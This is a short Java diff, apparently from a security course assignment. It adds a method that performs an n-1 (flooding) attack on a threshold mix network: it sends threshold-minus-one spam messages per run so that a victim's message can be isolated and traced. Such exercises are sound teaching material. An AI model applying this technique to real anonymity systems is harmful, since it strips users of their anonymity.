@@ -62,6 +62,28 @@ public class Assignment1 {
     		ex.printStackTrace();
     	}
     }
+    
+    public void runAssignment3A() {
+    	// params for n-1 attack
+    	int runs = 10;
+    	int threshold = 7;
+    	int runPauseTime = 500; // should be large enough to allow victim to send but not so large for two legit messages
+    	
+    	try {
+    		// perform multiple runs so we don't need to time our attack
+	    	for (int i=0; i<runs; i++) {
+	    		// spam until threshold is almost reaches (n-1)
+		    	for (int j=1; j<threshold; j++) {
+			    	this.sendMessage("Boo! #" + i + "|" + j);	
+		    	}
+		    	// give the victim time to send his/her message
+		    	Thread.sleep(runPauseTime);
+	    	}
+    	} catch (Exception ex) {
+    		System.out.println("ohoh! " + ex.getMessage());
+    		ex.printStackTrace();
+    	}
+    }
 
     private void generateSymKeys() {
     	try {
